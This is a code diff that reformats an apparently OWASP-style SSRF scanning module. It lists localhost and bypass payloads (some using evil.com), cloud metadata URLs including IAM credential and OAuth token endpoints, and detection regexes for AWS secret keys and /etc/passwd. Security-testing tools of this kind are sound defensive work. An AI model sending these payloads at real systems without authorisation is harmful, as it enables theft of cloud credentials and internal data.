@@ -51,16 +51,13 @@ class SSRFAttack(BaseOWASPAttack):
         "http://2130706433/",  # 127.0.0.1
         "http://017700000001/",  # Octal
         "http://0x7f000001/",  # Hex
-
         # URL encoding
         "http://127.0.0.1%00@evil.com/",
         "http://evil.com@127.0.0.1/",
         "http://127.0.0.1#@evil.com/",
-
         # DNS rebinding style
         "http://localtest.me/",  # Resolves to 127.0.0.1
         "http://127.0.0.1.nip.io/",
-
         # Protocol variations
         "http://localhost:22/",  # SSH
         "http://localhost:3306/",  # MySQL
@@ -77,24 +74,18 @@ class SSRFAttack(BaseOWASPAttack):
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "http://169.254.169.254/latest/user-data/",
         "http://169.254.169.254/latest/dynamic/instance-identity/document",
-
         # AWS IMDSv2 token endpoint
         "http://169.254.169.254/latest/api/token",
-
         # GCP
         "http://169.254.169.254/computeMetadata/v1/",
         "http://metadata.google.internal/computeMetadata/v1/",
-
         # Azure
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "http://169.254.169.254/metadata/identity/oauth2/token",
-
         # DigitalOcean
         "http://169.254.169.254/metadata/v1/",
-
         # Oracle Cloud
         "http://169.254.169.254/opc/v1/",
-
         # Alibaba Cloud
         "http://100.100.100.200/latest/meta-data/",
     ]
@@ -111,42 +102,67 @@ class SSRFAttack(BaseOWASPAttack):
 
     # Common URL parameters to test
     URL_PARAMETERS = [
-        "url", "uri", "path", "link", "src", "source",
-        "dest", "destination", "target", "page", "feed",
-        "redirect", "return", "next", "site", "host",
-        "fetch", "download", "load", "proxy", "image",
-        "img", "file", "document", "pdf", "callback",
-        "continue", "go", "goto", "view", "open",
+        "url",
+        "uri",
+        "path",
+        "link",
+        "src",
+        "source",
+        "dest",
+        "destination",
+        "target",
+        "page",
+        "feed",
+        "redirect",
+        "return",
+        "next",
+        "site",
+        "host",
+        "fetch",
+        "download",
+        "load",
+        "proxy",
+        "image",
+        "img",
+        "file",
+        "document",
+        "pdf",
+        "callback",
+        "continue",
+        "go",
+        "goto",
+        "view",
+        "open",
     ]
 
     # Patterns indicating SSRF success
     SSRF_SUCCESS_PATTERNS = {
         "internal_html": [
-            r'<title>.*Index of.*</title>',
-            r'Apache.*Server at',
-            r'nginx',
-            r'Welcome to nginx',
+            r"<title>.*Index of.*</title>",
+            r"Apache.*Server at",
+            r"nginx",
+            r"Welcome to nginx",
         ],
         "cloud_metadata": [
-            r'ami-[a-f0-9]+',
-            r'instance-id',
-            r'placement/availability-zone',
-            r'iam/security-credentials',
-            r'AccessKeyId',
-            r'SecretAccessKey',
-            r'computeMetadata',
+            r"ami-[a-f0-9]+",
+            r"instance-id",
+            r"placement/availability-zone",
+            r"iam/security-credentials",
+            r"AccessKeyId",
+            r"SecretAccessKey",
+            r"computeMetadata",
         ],
         "internal_services": [
-            r'redis_version',
-            r'MySQL',
-            r'PostgreSQL',
-            r'MongoDB',
-            r'MEMCACHED',
+            r"redis_version",
+            r"MySQL",
+            r"PostgreSQL",
+            r"MongoDB",
+            r"MEMCACHED",
         ],
         "file_access": [
-            r'root:.*:0:0:',  # /etc/passwd
-            r'\[extensions\]',  # win.ini
-            r'127\.0\.0\.1\s+localhost',  # /etc/hosts
+            r"root:.*:0:0:",  # /etc/passwd
+            r"\[extensions\]",  # win.ini
+            r"127\.0\.0\.1\s+localhost",  # /etc/hosts
         ],
     }
 
@@ -174,33 +190,35 @@ class SSRFAttack(BaseOWASPAttack):
     def get_config_options(self) -> Dict[str, Any]:
         """Get configuration options."""
         options = super().get_config_options()
-        options.update({
-            "test_localhost": {
-                "type": "boolean",
-                "default": True,
-                "description": "Test localhost and internal IP access"
-            },
-            "test_cloud": {
-                "type": "boolean",
-                "default": True,
-                "description": "Test cloud metadata endpoint access"
-            },
-            "test_protocols": {
-                "type": "boolean",
-                "default": True,
-                "description": "Test alternative protocol access (file://, gopher://)"
-            },
-            "test_bypass": {
-                "type": "boolean",
-                "default": True,
-                "description": "Test SSRF filter bypass techniques"
-            },
-            "custom_params": {
-                "type": "array",
-                "default": [],
-                "description": "Additional URL parameters to test"
+        options.update(
+            {
+                "test_localhost": {
+                    "type": "boolean",
+                    "default": True,
+                    "description": "Test localhost and internal IP access",
+                },
+                "test_cloud": {
+                    "type": "boolean",
+                    "default": True,
+                    "description": "Test cloud metadata endpoint access",
+                },
+                "test_protocols": {
+                    "type": "boolean",
+                    "default": True,
+                    "description": "Test alternative protocol access (file://, gopher://)",
+                },
+                "test_bypass": {
+                    "type": "boolean",
+                    "default": True,
+                    "description": "Test SSRF filter bypass techniques",
+                },
+                "custom_params": {
+                    "type": "array",
+                    "default": [],
+                    "description": "Additional URL parameters to test",
+                },
             }
-        })
+        )
         return options
 
     def get_test_cases(self) -> List[OWASPTestCase]:
@@ -211,22 +229,22 @@ class SSRFAttack(BaseOWASPAttack):
                 description="Test for internal resource access",
                 category=OWASPCategory.A10_SSRF,
                 payloads=self.LOCALHOST_PAYLOADS,
-                detection_patterns=self.SSRF_SUCCESS_PATTERNS["internal_html"]
+                detection_patterns=self.SSRF_SUCCESS_PATTERNS["internal_html"],
             ),
             OWASPTestCase(
                 name="Cloud Metadata SSRF",
                 description="Test for cloud metadata endpoint access",
                 category=OWASPCategory.A10_SSRF,
                 payloads=self.CLOUD_METADATA_PAYLOADS,
-                detection_patterns=self.SSRF_SUCCESS_PATTERNS["cloud_metadata"]
+                detection_patterns=self.SSRF_SUCCESS_PATTERNS["cloud_metadata"],
             ),
             OWASPTestCase(
                 name="Protocol Smuggling",
                 description="Test for alternative protocol access",
                 category=OWASPCategory.A10_SSRF,
                 payloads=self.PROTOCOL_PAYLOADS,
-                detection_patterns=self.SSRF_SUCCESS_PATTERNS["file_access"]
-            )
+                detection_patterns=self.SSRF_SUCCESS_PATTERNS["file_access"],
+            ),
         ]
 
     def _find_url_parameters(self, target: str) -> List[str]:
@@ -242,9 +260,9 @@ class SSRFAttack(BaseOWASPAttack):
 
             # Find URL parameters in the page
             param_patterns = [
-                r'name=["\'](' + '|'.join(self.URL_PARAMETERS) + r')["\']',
-                r'id=["\'](' + '|'.join(self.URL_PARAMETERS) + r')["\']',
-                r'\?(' + '|'.join(self.URL_PARAMETERS) + r')=',
+                r'name=["\'](' + "|".join(self.URL_PARAMETERS) + r')["\']',
+                r'id=["\'](' + "|".join(self.URL_PARAMETERS) + r')["\']',
+                r"\?(" + "|".join(self.URL_PARAMETERS) + r")=",
             ]
 
             for pattern in param_patterns:
@@ -299,7 +317,9 @@ class SSRFAttack(BaseOWASPAttack):
 
         return findings
 
-    def _test_localhost_ssrf(self, target: str, params: List[str]) -> Generator[Finding, None, None]:
+    def _test_localhost_ssrf(
+        self, target: str, params: List[str]
+    ) -> Generator[Finding, None, None]:
         """Test for localhost/internal IP SSRF."""
         if not self._config.get("test_localhost", True):
             return
@@ -329,24 +349,26 @@ class SSRFAttack(BaseOWASPAttack):
                         title="SSRF Vulnerability: Internal Resource Access",
                         severity=Severity.HIGH,
                         description=f"Server-Side Request Forgery detected. "
-                                   f"Parameter '{param}' allows access to internal resources.",
+                        f"Parameter '{param}' allows access to internal resources.",
                         evidence=f"URL: {test_url}, Type: {result['type']}, "
-                                f"Evidence: {result['evidence']}",
+                        f"Evidence: {result['evidence']}",
                         remediation="Validate and sanitize URL inputs. Use allowlists for "
-                                   "permitted domains. Block requests to internal IPs and localhost.",
+                        "permitted domains. Block requests to internal IPs and localhost.",
                         metadata={
                             "parameter": param,
                             "payload": payload,
                             "type": result["type"],
-                            "evidence": result["evidence"]
-                        }
+                            "evidence": result["evidence"],
+                        },
                     )
 
                 current += 1
                 self.set_progress(current / total * 25)
                 time.sleep(self._delay_between_requests)
 
-    def _test_cloud_metadata(self, target: str, params: List[str]) -> Generator[Finding, None, None]:
+    def _test_cloud_metadata(
+        self, target: str, params: List[str]
+    ) -> Generator[Finding, None, None]:
         """Test for cloud metadata endpoint access."""
         if not self._config.get("test_cloud", True):
             return
@@ -384,8 +406,8 @@ class SSRFAttack(BaseOWASPAttack):
                             "parameter": param,
                             "payload": payload,
                             "cloud_provider": self._detect_cloud_provider(payload),
-                            "evidence": result["evidence"]
-                        }
+                            "evidence": result["evidence"],
+                        },
                     )
 
                 current += 1
@@ -409,7 +431,9 @@ class SSRFAttack(BaseOWASPAttack):
             return "Alibaba Cloud"
         return "Unknown"
 
-    def _test_protocol_smuggling(self, target: str, params: List[str]) -> Generator[Finding, None, None]:
+    def _test_protocol_smuggling(
+        self, target: str, params: List[str]
+    ) -> Generator[Finding, None, None]:
         """Test for protocol smuggling attacks."""
         if not self._config.get("test_protocols", True):
             return
@@ -440,16 +464,16 @@ class SSRFAttack(BaseOWASPAttack):
                         title=f"SSRF: Protocol Smuggling ({protocol}://)",
                         severity=severity,
                         description=f"SSRF vulnerability allows {protocol}:// protocol access. "
-                                   "This can be used to read local files or access internal services.",
+                        "This can be used to read local files or access internal services.",
                         evidence=f"URL: {test_url}, Payload: {payload}",
                         remediation="Restrict allowed protocols to http/https only. "
-                                   "Validate and sanitize all URL inputs.",
+                        "Validate and sanitize all URL inputs.",
                         metadata={
                             "parameter": param,
                             "payload": payload,
                             "protocol": protocol,
-                            "evidence": result["evidence"]
-                        }
+                            "evidence": result["evidence"],
+                        },
                     )
 
                 current += 1
@@ -499,15 +523,15 @@ class SSRFAttack(BaseOWASPAttack):
                         title=f"Potential SSRF Surface: {endpoint}",
                         severity=Severity.LOW,
                         description=f"Endpoint may be vulnerable to SSRF. "
-                                   f"URL-related indicators found: {found_indicators}",
+                        f"URL-related indicators found: {found_indicators}",
                         evidence=f"URL: {test_url}, Status: {response.status_code}",
                         remediation="Review this endpoint for SSRF vulnerabilities. "
-                                   "Implement strict URL validation if it accepts URL parameters.",
+                        "Implement strict URL validation if it accepts URL parameters.",
                         metadata={
                             "endpoint": endpoint,
                             "indicators": found_indicators,
-                            "status_code": response.status_code
-                        }
+                            "status_code": response.status_code,
+                        },
                     )
 
             self.set_progress(75 + (idx + 1) / total * 25)
@@ -532,7 +556,7 @@ class SSRFAttack(BaseOWASPAttack):
             description="Starting Server-Side Request Forgery scan",
             evidence=f"Target: {target}",
             remediation="N/A - Informational",
-            metadata={"target": target}
+            metadata={"target": target},
         )
 
         try:
@@ -562,5 +586,5 @@ class SSRFAttack(BaseOWASPAttack):
             description="Completed Server-Side Request Forgery scan",
             evidence=f"Target: {target}",
             remediation="N/A - Informational",
-            metadata={"target": target}
+            metadata={"target": target},
         )
